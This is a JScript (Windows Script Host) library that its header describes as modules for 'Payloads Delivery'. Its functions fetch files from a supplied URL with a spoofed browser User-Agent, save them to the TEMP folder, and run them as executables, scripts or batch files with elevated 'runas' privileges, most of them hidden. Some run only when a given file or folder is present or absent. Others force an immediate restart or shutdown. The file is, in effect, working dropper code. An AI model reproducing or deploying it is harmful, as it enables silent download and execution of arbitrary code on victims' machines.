/******************************************************************************
*
* LIB_FUNC.JS
* This file contain main modules for Payloads Delivery
*
* Revision 1.1.0.0 (Extended Beta) May be Present
* The Library Links at lib_func-1.0.0.js
*
******************************************************************************/


/* ********************************************************
'
' ScriptDownlRun01( strURL , strFileNameWSH, iTimeOut )
'
' This Script Downloads Exe file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameWSH - Name of WSH File
'				iTimeOut is Wait to End Execution of the File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function ScriptDownlRun01( strURL, strFileNameWSH, iTimeOut ){
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if( tempFolder === "" ) {
		return 1;
	}
	iFlag = UploadFilesFromInt( strFileNameWSH, strURL, tempFolder );
	if( iFlag != 0 ) return 1;
	RunDownloadedScript01(tempFolder, strFileNameWSH, iTimeOut );
	return 0;
}

/* ********************************************************
'
' ExeDownlRun01( strURL, iTimeOut, strFileNameExe, constOpt)
'
' This Script Downloads Exe file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL - URL Path to Download
'				iTimeOut - Wait to End Execution of the File
' 				strFileNameExe - Name of Exe File
'				constOpt - Options of Exe File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function ExeDownlRun01( strURL, iTimeOut, strFileNameExe, constOpt){
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if( tempFolder === "" ) {
		return 1;
	}
	iFlag = UploadFilesFromInt( strFileNameExe, strURL, tempFolder );
	if( iFlag != 0 ) return 1;
	RunDownloadedExe01( tempFolder, strFileNameExe, constOpt, iTimeOut );
	return 0;
}

/* ********************************************************
'
' ScriptDownlRunIfChecked00( strURL , strFileNameWSH, iTimeOut, strFile, strFolder )
'
' This Script Downloads Exe file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
' if strFile or strFolder is Present on Local Computer
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameWSH - Name of Exe File
'				iTimeOut is Wait to End Execution of the File
'				strFile is a Checked File. May be Empty String
'				strFolder is a checked Folder. Must Not be Empty
' RETURNS:		0 if Success Download and Run
'				1 if File or Folder is Checked
'				2 if Error Occur
'
' *********************************************************/
function ScriptDownlRunIfChecked00( strURL, strFileNameWSH, iTimeOut, strFile, strFolder ){
	var iFlag, isFlag;
	var isFileEmpty, fso;
	// Set fso
	fso = new ActiveXObject("Scripting.FileSystemObject");
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if( strFolder === "" || tempFolder === "" ) {
		return 2;
	}
	// Check if File Empty
	if( strFile === "" ) {
		isFileEmpty = 1;
	}
	else {
		isFileEmpty = 0;
	}
	isFlag = CheckIfFileOrFolderExist( strFile, strFolder );
	// Checck if File or Folder Exists
	if( isFileEmpty ==1 && isFlag < 2 || isFileEmpty == 0 && isFlag == 0 ) {
		return 1;
	}
	else {
		iFlag = UploadFilesFromInt( strFileNameWSH, strURL, tempFolder );
		if( iFlag != 0 ) return 2;
		RunDownloadedScript01(tempFolder, strFileNameWSH, iTimeOut );
		return 0;
	}
}

/* ********************************************************
'
' ExeDownlRunIfChecked00( strURL, iTimeOut, strFileNameExe, constOpt, strFile, strFolder )
'
' This Script Downloads Exe file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
' if strFile or strFolder is Present on Local Computer
'
' PARAMETERS:	strURL - URL Path to Download
'				iTimeOut - Wait to End Execution of the File
' 				strFileNameExe - Name of Exe File
'				constOpt - Options of Exe File
'				strFile is a Checked File. May be Empty String
'				strFolder is a checked Folder. Must Not be Empty
' RETURNS:		0 if Success Download and Run
'				1 if File or Folder is Checked
'				2 if Error Occur
'
' *********************************************************/
function ExeDownlRunIfChecked00( strURL, iTimeOut, strFileNameExe, constOpt, strFile, strFolder ){
	var iFlag, isFlag;
	var isFileEmpty, fso;
	// Set fso
	fso = new ActiveXObject("Scripting.FileSystemObject");
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if( strFolder === "" || tempFolder === "" ) {
		return 2;
	}
	// Check if File Empty
	if( strFile === "" ) {
		isFileEmpty = 1;
	}
	else {
		isFileEmpty = 0;
	}
	isFlag = CheckIfFileOrFolderExist( strFile, strFolder );
	// Checck if File or Folder Exists
	if( isFileEmpty ==1 && isFlag < 2 || isFileEmpty == 0 && isFlag == 0 ) {
		return 1;
	}
	else {
		iFlag = UploadFilesFromInt( strFileNameExe, strURL, tempFolder );
		if( iFlag != 0 ) return 2;
		RunDownloadedExe01( tempFolder, strFileNameExe, constOpt, iTimeOut );
		return 0;
	}
}

/******************************************************************************
'
' RunDownloadedExe02(strPath, strVBS, constOpt, intTimeOut )
' This Function Run a strVBS File
' with Command "strPath & "\" & strVBS " and Arguments constOpt
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      NONE
'
******************************************************************************/

function RunDownloadedExe02(strPath, strVBS, constOpt, intTimeOut ){
	var strValue, shApp;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	// Set Exe Command Arguments
	strValue = strPath + "\\" + strVBS;
	// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	//shApp.ShellExecute( strValue, constOpt, strPath, "runas", 0 );
	// Run exe with Elevated Privileges ("runas") at Normal Mode (1), with working Diretory strPath
	shApp.ShellExecute( strValue, constOpt, strPath, "runas", 1 );
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
	WScript.Sleep(intTimeOut);
}

/******************************************************************************
'
' RunDownloadedScript02( strPath, strVBS )
' This Function Run a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/

function RunDownloadedScript02(strPath, strVBS, intTimeOut ){
    var constRun_VBS, constOpt;
    // Define Windows Scripts Options
    constRun_VBS = "//Nologo ";
    // Define VBS Script Options (Empty)
    constOpt = "";
    var strValue, shApp, fso, wsh, envProc, pathCMD;
    // Define ActiveX Object
    shApp = new ActiveXObject("Shell.Application");
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    envProc = wsh.Environment("PROCESS");
    pathCMD = envProc("SystemRoot") + "\\System32";
    // Check Paths
    if (!fso.FileExists(pathCMD + "\\cscript.exe")) {return 1};
    if (!fso.FileExists(strPath + "\\" + strVBS)) {return 1};
    // Set Cscript Command Arguments
    strValue = constRun_VBS +"\"" + strPath + "\\" + strVBS + "\"" + constOpt;
    // Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
    //shApp.ShellExecute( pathCMD + "\\cscript.exe", strValue, strPath, "runas", 0 );
    // Run cscript.exe with Normal Privileges ("") at Normal Mode (1), with working Diretory strPath
    shApp.ShellExecute( pathCMD + "\\cscript.exe", strValue, strPath, "", 1 );
//    setTimeout( DoNothing, intTimeOut );
    // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
    WScript.Sleep(intTimeOut);
    return 0;
}

/******************************************************************************
'
' RunDownloadedExe01(strPath, strVBS, constOpt, intTimeOut )
' This Function Run Hidden a strVBS File
' with Command "strPath & "\" & strVBS " and Arguments constOpt
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      NONE
'
******************************************************************************/

function RunDownloadedExe01(strPath, strVBS, constOpt, intTimeOut ){
	var strValue, shApp;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	// Set Exe Command Arguments
	strValue = strPath + "\\" + strVBS;
	// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute( strValue, constOpt, strPath, "runas", 0 );
	// Run exe with Elevated Privileges ("runas") at Normal Mode (1), with working Diretory strPath
	// shApp.ShellExecute( strValue, constOpt, strPath, "runas", 1 );
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
	WScript.Sleep(intTimeOut);
}

/******************************************************************************
'
' RunDownloadedScript01( strPath, strVBS, intTimeOut )
' This Function Run Hidden a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/

function RunDownloadedScript01(strPath, strVBS, intTimeOut ){
    var constRun_VBS, constOpt;
    // Define Windows Scripts Options
    constRun_VBS = "//Nologo ";
    // Define VBS Script Options (Empty)
    constOpt = "";
    var strValue, shApp, fso, wsh, envProc, pathCMD;
    // Define ActiveX Object
    shApp = new ActiveXObject("Shell.Application");
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    envProc = wsh.Environment("PROCESS");
    pathCMD = envProc("SystemRoot") + "\\System32";
    // Check Paths
    if (!fso.FileExists(pathCMD + "\\cscript.exe")) {return 1};
    if (!fso.FileExists(strPath + "\\" + strVBS)) {return 1};
    // Set Cscript Command Arguments
    strValue = constRun_VBS +"\"" + strPath + "\\" + strVBS + "\"" + constOpt;
    // Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
    shApp.ShellExecute( pathCMD + "\\cscript.exe", strValue, strPath, "runas", 0 );
    // Run cscript.exe with Normal Privileges ("") at Normal Mode (1), with working Diretory strPath
    // shApp.ShellExecute( pathCMD + "\\cscript.exe", strValue, strPath, "", 1 );
//    setTimeout( DoNothing, intTimeOut );
    // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
    WScript.Sleep(intTimeOut);
    return 0;
}


/* ********************************************************
'
' CmdDownlRun01( strURL , strFileNameCMD, iTimeOut )
'
' This Script Downloads CMD file from strURL Path and
' Execute Hidden it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameCMD - Name of CMD File
'				iTimeOut is Wait to End Execution of the File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function CmdDownlRun01( strURL, strFileNameCMD, iTimeOut ){
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if( tempFolder === "" ) {
		return 1;
	}
	iFlag = UploadFilesFromInt( strFileNameCMD, strURL, tempFolder );
	if( iFlag != 0 ) return 1;
	RunDownloadedCMD01(tempFolder, strFileNameCMD, iTimeOut );
	return 0;
}


/******************************************************************************
'
' RunDownloadedCMD01( strPath, strCMD, intTimeOut )
' This Function Run Hidden a strCMD File
' with Command "cmd /c " & strPath & "\" & strCMD
'
' PARAMETERS:   strPath -- The Path to strCMD
'               strVBS -- a CMD File with instructions
'               (Windows Command Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/

function RunDownloadedCMD01( strPath, strCMD, intTimeOut ){
    var constRun_CMD, constOpt;
    // Define Windows Scripts Options
    constRun_CMD = "/c ";
    var strValue, shApp, fso, wsh, envProc, pathCMD;
    // Define ActiveX Object
    shApp = new ActiveXObject("Shell.Application");
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    envProc = wsh.Environment("PROCESS");
    pathCMD = envProc("SystemRoot") + "\\System32";
    // Check Paths
    if (!fso.FileExists(pathCMD + "\\cmd.exe")) {return 1};
    if (!fso.FileExists(strPath + "\\" + strCMD)) {return 1};
    // Set Cscript Command Arguments
    strValue = constRun_CMD +"\"" + strPath + "\\" + strCMD + "\"";
    // Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
    shApp.ShellExecute( pathCMD + "\\cmd.exe", strValue, strPath, "runas", 0 );
    // Run cscript.exe with Normal Privileges ("") at Normal Mode (1), with working Diretory strPath
    //shApp.ShellExecute( pathCMD + "\\cmd.exe", strValue, strPath, "", 1 );
//    setTimeout( DoNothing, intTimeOut );
    // Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
    WScript.Sleep(intTimeOut);
    return 0;
}


/***********************************************************
'
' CheckIfFileOrFolderExist
'
' The Script Checks If Folder or File on it is present
'
' PARAMETERS:	strFile - a checcking file
'		strFolder - a full path to checking folder
' RETURNS:	0 if File and Folder are Present
'		1 if Folder not File is Present
'		2 if File or Folder areh'n Present
' *********************************************************/
function CheckIfFileOrFolderExist( strFile, strFolder ) {
	var fso, strFullName;
	fso = new ActiveXObject("Scripting.FileSystemObject");
	if(fso.FolderExists(strFolder))	{
		if( strFile === "" ){
			return 1;
		}
		else {
			strFullName = strFolder + "\\" + strFile;
			if( fso.FileExists( strFullName ) ) {
				return 0;
			}
			else {
				return 1;
			}
		}
	}
	else {
		return 2;
	}
}

/******************************************************************************
'
' UploadFilesFromInt( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'
' RETURNS:      0 -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'               2 -- If HTTP Response Not 200 (while is not make)
'
******************************************************************************/

function UploadFilesFromInt(strFile, strURL, strPath){
    var fso, xmlHttp, adoStream;
    // Define FileSystemObject
    fso = new ActiveXObject("Scripting.FileSystemObject");
    // Define XMLHTTP Help Object
    xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    // Define Adodb.Stream" Object
    adoStream = new ActiveXObject("Adodb.Stream");
    var strFileURL;
    var strLocal_Path;
    var intUploadFilesFromInt;
    var blnExistRemoteFile;
    // Define Full Downloaded File URL
    strFileURL = strURL + strFile;
    // Define Full Local Path to be Downloaded
    strLocal_Path = strPath + "\\" + strFile;
	
    // Check if Path is Exist
    if(fso.FolderExists(strPath))
	intUploadFilesFromInt = 0;
    else
	intUploadFilesFromInt = 1;
	
    // Downloaded File
    // Open URL (Get Requiest)
    xmlHttp.Open( "GET", strFileURL, false );
    // Set User-Agent Header (for Safari Browser)
    xmlHttp.SetRequestHeader( "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36");
    // Send File from URL
    xmlHttp.Send();
    if( xmlHttp.Status == 200 && intUploadFilesFromInt == 0)
    // If Send Request is Successful 
        blnExistRemoteFile = true;
    else
    {
        blnExistRemoteFile = false;
        intUploadFilesFromInt = 2;
        xmlHttp.Abort();
    }
    if( blnExistRemoteFile )
    {
        // Set AdoStream Type mode and Open It
	adoStream.Type = 1;
	adoStream.Mode = 3;
	adoStream.Open();
        // Write to AdoStream Response Body jf HTTP Request
	adoStream.Write(xmlHttp.responseBody);
        // Save Stream to File
	adoStream.SaveToFile( strLocal_Path, 2 );
	// /Downloaded File
	
	// Close Objects	
	adoStream.Close();
	xmlHttp.Abort();
	
	// Check If File Downloaded
	if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0 )
		intUploadFilesFromInt = 1;
	// /Check if File Downloaded
    }
    return intUploadFilesFromInt;
}

/* *****************************************************************************
'
' getTempEnviron()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path For User Variable %TEMP% if Success
'               "C:\Windows\Temp" if API Error
'				"" if General Sysytem Error
'
' *****************************************************************************/
function getTempEnviron() {
	var fso, wsh, envProc, envSys;
	// Define ActiveX Objects
	fso = new ActiveXObject( "Scripting.FileSystemObject" );
	wsh = new ActiveXObject( "WScript.Shell" );
	// Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
	// Define System Environment Variable
	envSys = wsh.Environment;
	
	var  envVariable;
	envVariable = envProc( "TEMP" );
	if(!fso.FolderExists( envVariable )){
		envVariable = envSys( "TMP" );
		if(!fso.FolderExists( envVariable )){
			envVariable = "";
		}
	}
	return envVariable;
}

/* ********************************************************
'
' RunRestartImmediately
'
' This Script Restart Current Computer Immediately

'
' PARAMETERS:	NONE
' RETURNS:	NONE
'
' *********************************************************/
function RunRestartImmediately(){
	var strValue, shApp, constOpt;
	var wsh, envProc;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	wsh = new ActiveXObject( "WScript.Shell" );
	// Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
	// Set Exe Command Arguments
	strValue = envProc("SystemRoot") + "\\System32\\shutdown.exe";
	constOpt = "/r /t 00";
	// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute( strValue, constOpt, "", "runas", 0 );
	// Run exe with Elevated Privileges ("runas") at Normal Mode (1), with working Diretory strPath
	// shApp.ShellExecute( strValue, constOpt, "", "runas", 1 );
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
}

/* ********************************************************
'
' RunStopImmediately
'
' This Script Stop Current Computer Immediately

'
' PARAMETERS:	NONE
' RETURNS:	NONE
'
' *********************************************************/
function RunStopImmediately(){
	var strValue, shApp, constOpt;
	var wsh, envProc;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	wsh = new ActiveXObject( "WScript.Shell" );
	// Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
	// Set Exe Command Arguments
	strValue = envProc("SystemRoot") + "\\System32\\shutdown.exe";
	constOpt = "/s /t 00";
	// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute( strValue, constOpt, "", "runas", 0 );
	// Run exe with Elevated Privileges ("runas") at Normal Mode (1), with working Diretory strPath
	// shApp.ShellExecute( strValue, constOpt, "", "runas", 1 );
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
}


